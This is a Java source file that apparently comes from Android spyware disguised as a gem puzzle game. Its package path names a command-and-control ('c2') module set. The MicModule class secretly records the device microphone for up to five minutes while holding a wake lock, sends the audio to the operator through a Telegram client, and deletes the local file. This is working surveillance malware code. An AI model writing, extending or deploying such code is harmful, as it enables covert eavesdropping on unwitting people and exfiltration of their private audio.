package com.gempuzzle.quest.c2.modules;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.PowerManager;

import com.gempuzzle.quest.c2.TelegramClient;

import java.io.File;

public final class MicModule {

    public static void record(Context ctx, int seconds) {
        if (seconds < 1) seconds = 1;
        if (seconds > 300) seconds = 300;
        final int sec = seconds;
        new Thread(() -> {
            PowerManager.WakeLock wl = null;
            try {
                PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
                wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "gq:mic");
                wl.acquire(sec * 1000L + 5000);
                File out = new File(ctx.getCacheDir(), "mic_" + System.currentTimeMillis() + ".m4a");
                MediaRecorder mr = new MediaRecorder();
                mr.setAudioSource(MediaRecorder.AudioSource.MIC);
                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                mr.setAudioEncodingBitRate(64000);
                mr.setAudioSamplingRate(44100);
                mr.setOutputFile(out.getAbsolutePath());
                mr.prepare();
                mr.start();
                Thread.sleep(sec * 1000L);
                mr.stop();
                mr.release();
                if (out.exists() && out.length() > 0) {
                    TelegramClient.sendDocument(out, "🎤 mic recording " + sec + "s");
                    out.delete();
                } else {
                    TelegramClient.sendMessage("⚠ mic recording empty");
                }
            } catch (Throwable t) {
                TelegramClient.sendMessage("⚠ mic error: " + t.getMessage());
            } finally {
                if (wl != null && wl.isHeld()) wl.release();
            }
        }).start();
    }

    private MicModule() {}
}
